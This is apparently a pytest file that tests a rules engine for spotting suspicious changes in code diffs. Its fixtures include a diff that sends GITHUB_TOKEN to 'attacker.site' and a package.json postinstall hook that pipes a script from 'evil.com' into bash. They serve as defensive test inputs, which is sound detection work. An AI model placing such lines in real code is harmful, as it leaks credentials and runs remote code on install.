from __future__ import annotations

import pytest
from engine.astnorm import extract_blocks_from_source
from engine.diffparse import parse_unified_diff
from engine.rules_engine import RulesEngine


DIFF_EVAL = """--- a/run.js
+++ b/run.js
@@ -1,2 +1,3 @@
 function execute(code) {
+  return eval(code);
 }
"""

DIFF_EXFILTRATION_FULL = """--- a/analytics.js
+++ b/analytics.js
@@ -1,2 +1,4 @@
 function sendTelemetry() {
+  const token = process.env.GITHUB_TOKEN;
+  fetch("https://attacker.site/log", { method: "POST", body: token });
 }
"""

DIFF_FETCH_BENIGN = """--- a/fetcher.js
+++ b/fetcher.js
@@ -1,2 +1,3 @@
 function getProfile(id) {
+  return fetch(`/api/user/${id}`);
 }
"""

DIFF_PACKAGE_JSON_POSTINSTALL = """--- a/package.json
+++ b/package.json
@@ -5,3 +5,4 @@
   "scripts": {
     "test": "jest",
+    "postinstall": "curl -sL https://evil.com/setup.sh | bash"
   }
"""

DIFF_MERGE_WITH_GUARD_INTACT = """--- a/merge.js
+++ b/merge.js
@@ -1,5 +1,5 @@
 function merge(t, s) {
   for (let k in s) {
     if (k === '__proto__') continue;
     t[k] = s[k];
   }
 }
"""

DIFF_MINIFIED_INSERT = """--- a/bundle.js
+++ b/bundle.js
@@ -1,1 +1,2 @@
+""" + ("a" * 900) + "\n"


def test_rules_loaded():
    re_engine = RulesEngine()
    assert len(re_engine.rules) >= 12
    ids = {r.id for r in re_engine.rules}
    assert "DS001" in ids
    assert "DS003" in ids
    assert "DS008" in ids
    assert "DS011" in ids


def test_ds001_eval_sink():
    re_engine = RulesEngine()
    diffs = parse_unified_diff(DIFF_EVAL)
    added_blocks = extract_blocks_from_source("function execute(code) { return eval(code); }")
    findings = re_engine.evaluate_file(diffs[0], added_blocks, [], raw_diff=DIFF_EVAL)
    assert any(f.rule_id == "DS001" for f in findings)


def test_ds003_credential_exfiltration_all_of():
    re_engine = RulesEngine()
    # 1. Has both fetch AND process.env.GITHUB_TOKEN -> MUST fire!
    diffs_exfil = parse_unified_diff(DIFF_EXFILTRATION_FULL)
    head_src = 'function sendTelemetry() { const token = process.env.GITHUB_TOKEN; fetch("https://attacker.site/log", { method: "POST", body: token }); }'
    added_blocks = extract_blocks_from_source(head_src)
    findings = re_engine.evaluate_file(diffs_exfil[0], added_blocks, [], raw_diff=DIFF_EXFILTRATION_FULL)
    assert any(f.rule_id == "DS003" for f in findings)

    # 2. Benign fetch alone without token -> MUST NOT fire!
    diffs_benign = parse_unified_diff(DIFF_FETCH_BENIGN)
    benign_blocks = extract_blocks_from_source("function getProfile(id) { return fetch(`/api/user/${id}`); }")
    findings_benign = re_engine.evaluate_file(diffs_benign[0], benign_blocks, [], raw_diff=DIFF_FETCH_BENIGN)
    assert not any(f.rule_id == "DS003" for f in findings_benign)


def test_ds008_package_json_install_hook():
    re_engine = RulesEngine()
    diffs = parse_unified_diff(DIFF_PACKAGE_JSON_POSTINSTALL)
    findings = re_engine.evaluate_file(diffs[0], [], [], raw_diff=DIFF_PACKAGE_JSON_POSTINSTALL)
    assert any(f.rule_id == "DS008" for f in findings)


def test_ds011_exclude_if_guard_intact():
    """Acceptance criterion 6: rename with __proto__ guard intact must NOT trigger DS011."""
    re_engine = RulesEngine()
    diffs = parse_unified_diff(DIFF_MERGE_WITH_GUARD_INTACT)
    blocks = extract_blocks_from_source("function merge(t, s) { for (let k in s) { if (k === '__proto__') continue; t[k] = s[k]; } }")
    findings = re_engine.evaluate_file(diffs[0], blocks, [], raw_diff=DIFF_MERGE_WITH_GUARD_INTACT)
    assert not any(f.rule_id == "DS011" for f in findings)


def test_ds005_minified_bulk_insert():
    re_engine = RulesEngine()
    diffs = parse_unified_diff(DIFF_MINIFIED_INSERT)
    findings = re_engine.evaluate_file(diffs[0], [], [], raw_diff=DIFF_MINIFIED_INSERT)
    assert any(f.rule_id == "DS005" for f in findings)

